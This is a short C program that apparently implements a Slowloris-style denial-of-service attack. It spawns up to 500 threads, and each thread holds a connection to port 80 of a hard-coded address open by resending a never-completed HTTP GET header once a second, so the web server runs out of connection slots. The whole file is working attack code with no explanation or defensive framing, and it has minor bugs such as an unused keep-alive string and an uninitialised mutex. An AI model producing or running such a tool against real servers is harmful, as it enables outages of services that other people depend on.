#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TIMEOUT 1
#define MAX_T 500

unsigned short n_threads= 0;
pthread_mutex_t mutex;

typedef struct {
	struct sockaddr_in addr;
} tredi_args;

char header[1024] = "GET /toto HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0 .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nConnection:keep-alive\r\nContent-Length: 42\r\n";
char keep_alive[16] = "X-a: b\r\n";

void *tredi(void *args){
	tredi_args args_t = *(tredi_args*)args;

	int ls;
	if((ls = socket(AF_INET, SOCK_STREAM, 0)) == -1){
		perror("socket()");	
		pthread_mutex_lock(&mutex);
		n_threads--;
		pthread_mutex_unlock(&mutex);
		pthread_exit(NULL);
	}

	if(connect(ls, (struct sockaddr*)&args_t.addr, sizeof(args_t.addr)) == -1) {
		perror("connect()");
		pthread_mutex_lock(&mutex);
		n_threads--;
		pthread_mutex_unlock(&mutex);
		pthread_exit(NULL);
	}

	if(send(ls, header, strlen(header), 0) == -1){
		perror("send()");
		pthread_mutex_lock(&mutex);
		n_threads--;
		pthread_mutex_unlock(&mutex);
		pthread_exit(NULL);
	}

	while(1){
		if(send(ls, header, strlen(header), 0) == -1){
			perror("send()");
			pthread_mutex_lock(&mutex);
			n_threads--;
			pthread_mutex_unlock(&mutex);
			pthread_exit(NULL);
		}
		sleep(TIMEOUT);
	}

}

int main(int argc, char *argv[]){
	
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(80);
	addr.sin_addr.s_addr = inet_addr("172.21.209.231");

	tredi_args arg;
	arg.addr = addr;

	pthread_t a;
	while(1){
		if(n_threads < 500){
			pthread_create(&a, NULL, tredi, (void*)&arg);
			pthread_mutex_lock(&mutex);
			n_threads++;
			pthread_mutex_unlock(&mutex);
		} else sleep(2);
	}
	printf("%d\n", n_threads);

	return 0;
}
